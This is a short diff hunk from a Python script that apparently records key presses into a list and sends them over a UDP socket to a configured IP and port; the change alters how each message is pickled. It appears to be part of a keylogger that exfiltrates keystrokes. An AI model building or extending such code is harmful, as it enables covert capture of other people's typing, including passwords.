@@ -12,7 +12,7 @@ import threading
 keys = []
 
 def SendMessage(msg):
-    client.sendto(pl.dumps(str(msg).encode('utf-8'), protocol = 3), (IP, PORT))
+    client.sendto(pl.dumps(msg, protocol = 3), (IP, PORT))
     
 def OnPress(key):
     global listener
